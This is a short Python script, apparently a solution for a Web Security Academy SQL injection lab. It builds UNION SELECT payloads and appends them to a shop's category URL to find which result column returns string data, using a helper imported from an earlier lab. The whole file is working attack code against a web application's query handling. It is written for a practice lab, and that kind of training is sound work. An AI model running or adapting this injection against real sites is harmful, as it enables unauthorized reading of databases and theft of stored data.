from Lab1 import get_cols_no
import requests
from pwn import *

def determine_col(url, cols, secret='\'a\''):
    index = []
    for i in range(cols):
        payload = 'null, ' * i + secret + ', null' * (cols - 1 - i)
        new_url = url + '\' union select {}--'.format(payload)
        response = requests.get(new_url)
        if response.status_code == 200:
            log.success(new_url)
            index.append(i)
    return index

if __name__ == '__main__':
    secret = '\'YZK8Gh\''
    url = 'https://acfc1f0f1ec186dc806e0d4000cf000b.web-security-academy.net/filter?category=Accessories'
    col_no = get_cols_no(url, 1, 10)
    determine_col(url, col_no)